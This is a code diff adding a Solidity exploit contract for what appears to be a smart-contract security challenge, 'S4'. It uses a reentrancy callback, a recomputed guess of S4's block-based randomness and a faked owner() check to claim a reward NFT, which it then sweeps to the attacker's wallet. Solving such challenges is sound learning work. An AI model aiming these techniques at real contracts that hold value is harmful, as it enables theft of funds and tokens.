@@ -74,4 +74,81 @@ interface IS4 {
         _;
     }
 
+    /**
+     * @param _s4 Address of the target S4 challenge contract.
+     */
+    constructor(address _s4) {
+        i_s4 = _s4;
+        i_owner = msg.sender;
+    }
+
+    /**
+     * @notice Starts the exploit sequence.
+     * @dev First entry into S4: sets its internal flag and triggers a `call` to `go()`.
+     *      The `guess` passed here is ignored by S4 in the first branch.
+     */
+    function solvingChallenge() external onlyOwner {
+        IS4(i_s4).solveChallenge(0, TWITTER_HANDLE);
+    }
+
+    /**
+     * @notice Returns this contract’s address.
+     * @dev S4 performs `staticcall` to `msg.sender.owner()` and expects `owner() == msg.sender`.
+     * @return The address of this contract.
+     */
+    function owner() external view returns (address) {
+        return address(this);
+    }
+
+    /**
+     * @notice Re-entrancy entrypoint called by S4 during the first attempt.
+     * @dev Must only be callable by the S4 contract. Computes the RNG identically to S4
+     *      (using the same block values and this contract’s address) and re-enters with the correct `guess`.
+     * @return Always returns true; S4 only checks for success (no revert).
+     */
+    function go() external returns (bool){
+        require(msg.sender == i_s4, "Only S4 can run");
+        uint256 guess = computeGuess();
+
+        emit DebugGuess(guess, address(this), block.timestamp, block.prevrandao);
+
+        IS4(i_s4).solveChallenge(guess, TWITTER_HANDLE);
+        return true;
+    }
+
+    /**
+     * @notice Computes the same RNG that S4 uses in its second branch.
+     * @dev Critical detail: use `address(this)` (the attacker) as `msg.sender` input to the hash.
+     * @return The RNG modulo 1_000_000.
+     */
+    function computeGuess() internal view returns (uint256) {
+        bytes32 guess = keccak256(abi.encodePacked(address(this), block.prevrandao, block.timestamp));
+        return uint256(guess) % 1_000_000;
+    }
+
+    /**
+     * @inheritdoc IERC721Receiver
+     * @dev Required to accept safe mints/transfers; emits a diagnostic event for visibility.
+     */
+    function onERC721Received(
+        address operator,
+        address from,
+        uint256 tokenId,
+        bytes calldata
+    ) external override returns (bytes4) {
+        emit NftReceived(msg.sender, tokenId, operator, from);
+        return IERC721Receiver.onERC721Received.selector;
+    }
+
+    /**
+     * @notice Transfers an ERC-721 token held by this contract to the owner EOA.
+     * @dev Use after a successful solve to move the reward NFT to your wallet.
+     * @param nft The ERC-721 contract address.
+     * @param tokenId The token ID to transfer.
+     */
+    function sweep721(address nft, uint256 tokenId) external onlyOwner {
+        emit NftSwept(nft, tokenId, i_owner);
+        IERC721(nft).safeTransferFrom(address(this), i_owner, tokenId);
+    }
+}
    
